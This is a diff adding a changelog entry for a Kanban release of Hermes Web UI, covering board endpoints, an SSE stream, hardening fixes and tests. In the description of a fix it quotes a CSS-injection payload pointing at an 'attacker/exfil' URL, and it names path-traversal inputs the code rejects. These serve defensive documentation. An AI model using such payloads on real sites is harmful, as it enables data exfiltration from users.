@@ -1,5 +1,77 @@
 # Hermes Web UI -- Changelog
 
+## [v0.51.0] — 2026-05-04 — Kanban v1
+
+### Added — Kanban v1: complete first-party Kanban for Hermes (closes #1645, #1646, #1647, #1649, #1654, #1655, #1660, #1675)
+
+The full Kanban feature lands as a 12-commit stack giving the WebUI **first-party-compatible parity** with the Hermes Agent dashboard plugin's Kanban surface. A small team can now run their entire ticket-tracking flow directly inside the WebUI panel, sharing a single source of truth (`~/.hermes/kanban.db` + per-board `~/.hermes/kanban/boards/<slug>/kanban.db`) with the agent CLI, gateway slash commands, and dashboard.
+
+**Stacked on previously-shipped foundation** (v0.50.275–v0.50.297 introduced read-only Kanban panel, write semantics, task detail expansion, dashboard-parity core controls, UI parity polish, and review-feedback hardening). This release completes the picture with multi-board management and real-time event streaming.
+
+**Multi-board management** (#1675, ~1900 LOC of new feature work):
+
+- 5 new endpoints mirroring the agent dashboard plugin contract verbatim:
+  - `GET /api/kanban/boards` — list all boards with per-status task counts + active-board pointer
+  - `POST /api/kanban/boards` — create board (idempotent on slug)
+  - `PATCH /api/kanban/boards/<slug>` — rename / update display metadata (slug is immutable)
+  - `DELETE /api/kanban/boards/<slug>` — archive (default; reversible from `kanban/boards/_archived/`) or `?delete=1` hard-delete
+  - `POST /api/kanban/boards/<slug>/switch` — set active board (writes shared cross-process pointer at `<root>/kanban/current`)
+- All existing per-board endpoints accept `?board=<slug>` query param (or `board` in JSON body); query takes precedence over body
+- Frontend: `Default ▾` switcher pill in the panel header, click-anchored menu listing every board (current first) with per-status total badges + 3 actions (New / Rename / Archive). Modal handles both create and rename (slug auto-derives from name with manual override). Archive routes through the existing `showConfirmDialog` with a clear "tasks remain on disk and the board can be restored from kanban/boards/_archived/" message.
+- Active-board state persists to `localStorage['hermes-kanban-active-board']` so a refresh stays put. The on-disk pointer is the cross-process source of truth, kept in sync via the switch endpoint.
+- Default board is protected from deletion (would leave system without fallback active board).
+- Slug normalisation goes through `kb._normalize_board_slug()` which rejects path-traversal patterns (`../etc/passwd`, `..\windows`) at validation time.
+
+**Real-time SSE event stream** (#1675):
+
+- New `GET /api/kanban/events/stream` long-lived Server-Sent Events endpoint mirroring the agent dashboard's WebSocket `/events` contract event-for-event
+- 300ms server-side poll interval (matches agent dashboard's `_EVENT_POLL_SECONDS`), 200-event batch cap, 15s heartbeat keepalive
+- Each `event: events` frame emits `id: <event_id>` so EventSource auto-stores `Last-Event-ID` and resumes from the right cursor on reconnect; server reads `Last-Event-ID` from request headers as a fallback when `?since=` is absent (cross-drop resume without re-streaming the backlog)
+- Frontend uses `EventSource` by default with **automatic fallback to 30s HTTP polling** after 3 consecutive SSE failures (proxy strips `text/event-stream`, etc.)
+- 250ms debounce on event bursts coalesces N events into a single board re-fetch
+- SSE stream torn down cleanly when the user leaves the Kanban panel (no leaked threads on a long-running session)
+- **Why SSE not WebSocket**: the WebUI's existing transport is synchronous `BaseHTTPServer`. WebSocket would require an async refactor or a hijack-the-socket hack. SSE is the right tool for unidirectional server-pushed event streams, matches the existing `/api/approval/stream` and `/api/clarify/stream` patterns, and gives identical write-to-receive latency (~300ms) versus the agent dashboard's WebSocket path.
+
+**Bridge hardening** (#1660 + #1675 polish):
+
+- `read_only` flag now reports honest state across all 4 payload sites (`_board_payload`, `_events_payload`, `_task_log_payload`, no-change short-circuit). Was hardcoded `True` from the read-only-bridge era of #1645; bridge has been writable since #1649.
+- `ImportError` fallback: when `hermes_cli` isn't installed (webui-only deploy), all 4 verb handlers (GET/POST/PATCH/DELETE) return clean `503 kanban unavailable: <reason>` instead of bubbling 500s.
+- **Dispatcher contract enforcement** (a39ec45): bridge rejects raw `PATCH status='running'` with 400 + clear error message. Direct status writes to `running` would bypass the `claim_lock`/`claim_expires`/`started_at`/`worker_pid` machinery, breaking dispatcher coordination. The frontend never sends `running` (button removed + drop-target disabled); the bridge is defense-in-depth. `_set_status_direct()` helper mirrors the agent dashboard's same-named function for legitimate non-running transitions, nulling claim fields and closing active runs with `outcome='reclaimed'` when leaving `running`.
+- `blocked → ready` transitions route through `kb.unblock_task()` (fires `unblocked` event for live polling consumers), not raw UPDATE.
+- `done → archived` transitions route through `kb.archive_task()`.
+- **Archive race fix**: two-layer defense against `kb.connect(board=<slug>)` auto-materialising the directory + sqlite on first call, which would silently un-archive a board that was just removed. Frontend stops the SSE stream BEFORE the `DELETE` call (restarts on failure); bridge's `_kanban_sse_fetch_new` checks `kb.board_exists()` before `connect()`, returning empty results when the board is gone.
+- **CSS injection fix** (60874db, caught during independent security audit): `b.color` was being interpolated into a `style=""` attribute via `esc()` which HTML-escapes but doesn't prevent CSS-context injection (e.g. `color="red;background:url('http://attacker/exfil')"`). New `_kanbanSafeColor()` helper allowlists only `^#[0-9a-fA-F]{3,8}$` hex codes or `^[a-zA-Z]{3,32}$` named colors; everything else collapses to empty and the renderer drops the rule entirely.
+- **Routing-asymmetry fix** (Opus SHOULD-FIX #1): `PATCH/DELETE /api/kanban/boards/<slug>` now match the `/boards/<slug>` path BEFORE resolving `?board=`. A stray `?board=ghost` query param on a `PATCH /api/kanban/boards/experiments?board=ghost` no longer 404s on `ghost` — it correctly edits `experiments`. Mirrors the POST handler's structure.
+
+**Mobile responsive**:
+
+- 9 new rules under the existing `@media (max-width: 640px)` block covering the multi-board UI: switcher button (smaller padding/font), board-name truncation at 140px max-width, dropdown menu sized at `min(280px, 100vw - 24px)`, modal padding tightens, inline-row icon/color picker stacks vertically.
+
+**Polish**:
+
+- Accent-tinted Save button in the modal (was visually identical to Cancel before)
+- Modal + dropdown menu now use the same `linear-gradient` panel + accent border pattern as the existing `app-dialog` overlay (was using undefined `var(--panel)` falling back to transparent)
+- "Read-only view" banner now hidden by default in HTML and only shown when the bridge actually reports `read_only=true` (was permanently visible regardless of state)
+
+### Tests
+
+**4288 → 4356 passing** (+68 net).
+
+- `tests/test_kanban_bridge.py`: 18 → 41 tests (+23 covering board CRUD, slug validation, default-board protection, dispatcher routing, board isolation via `connect()` spy, SSE backlog/error-recovery/integration with worker thread + threading.Event watchdog, SSE `id:` lines, Last-Event-ID resume, PATCH/DELETE routing-order regression)
+- `tests/test_kanban_ui_static.py`: 15 → 27 tests (+12 covering switcher markup, modal markup, JS handler presence, REST verb usage, board-param plumbing, localStorage persistence, `showConfirmDialog` usage, EventSource subscription, polling fallback, panel-switch teardown, debouncing, CSS-injection regression)
+
+Total Kanban-specific test coverage: 33 → 68 tests (+35).
+
+### Pre-release verification
+
+- **Independent review (nesquena)**: APPROVED with one CSS-injection MUST-FIX caught and pushed before approval (60874db). Cross-tool checks against fresh `nousresearch/hermes-agent` tarball verified contract-for-contract parity with `plugins/kanban/dashboard/plugin_api.py` for all `/boards` endpoints + `/events` SSE wire format.
+- **Opus advisor on PR #1675 stage diff**: SHIP verdict. Two SHOULD-FIX items applied with regression tests (PATCH/DELETE routing reorder + SSE `id:` lines / Last-Event-ID resume). MUST-FIX: 0.
+- **Live end-to-end browser verification on port 8789**: Multi-board switcher, create/rename/archive flows, SSE 400ms live delivery, 5-task burst with 250ms debounce, `?board=` isolation across two boards, Last-Event-ID resume, CSS-injection fix renders safely. Zero JS errors throughout 11-step flow.
+
+### Acknowledgments
+
+This was a large stack of work. Massive thanks to **@ai-ag2026** for the full Kanban implementation across 12 commits. Reviewer security audit + CSS-injection fix by **@nesquena**. Multi-board + SSE design and integration by **@Michaelyklam** with AI-assist co-authorship.
+
 ## [v0.50.297] — 2026-05-04
 
 ### Fixed (3 PRs — closes #1658; refs #1458, #1652)
